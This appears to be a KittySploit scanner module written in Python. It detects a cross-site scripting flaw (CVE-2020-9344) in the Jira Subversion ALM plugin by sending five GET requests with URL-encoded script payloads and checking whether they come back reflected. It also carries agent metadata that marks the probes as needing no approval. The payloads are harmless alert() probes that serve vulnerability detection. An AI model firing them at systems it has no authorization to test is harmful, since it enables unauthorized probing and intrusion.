#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Jira Subversion ALM for Enterprise before 8."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Jira Subversion ALM for Enterprise <8.8.2 - Cross-Site Scripting Detection',
        'description': 'Jira Subversion ALM for Enterprise before 8.8.2 contains a cross-site scripting vulnerability at multiple locations.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2020', 'atlassian', 'jira', 'xss', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 5,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-9344',
            'https://kintosoft.atlassian.net/wiki/spaces/SVNALM/pages/753565697/Security+Bulletin',
            'https://www.syss.de/fileadmin/dokumente/Publikationen/Advisories/SYSS-2020-007.txt',
            'https://nvd.nist.gov/vuln/detail/CVE-2020-13483',
        ],
        'cve': 'CVE-2020-9344',
    }

    def run(self):
        for path in ('/plugins/servlet/svnwebclient/changedResource.jsp?url=%22%3E%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E', '/plugins/servlet/svnwebclient/commitGraph.jsp?%27)%3Balert(%22XSS', '/plugins/servlet/svnwebclient/commitGraph.jsp?url=%22%3E%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E', '/plugins/servlet/svnwebclient/error.jsp?errormessage=%27%22%3E%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E&description=test', '/plugins/servlet/svnwebclient/statsItem.jsp?url=%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E'):
            r = self.http_request(method="GET", path=path, allow_redirects=False)
            if not r or r.status_code != 200:
                continue
            body = (r.text or "").lower()
            headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items()).lower()
            body_all = ('<script>alert(document.domain)</script>', 'jira', 'subversion',)
            header_any = ('text/html',)
            if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
                self.set_info(
                    severity='medium',
                    reason="Jira Subversion ALM for Enterprise <8.8.2 - Cross-Site Scripting detected",
                    path=path,
                )
                return True
        return False

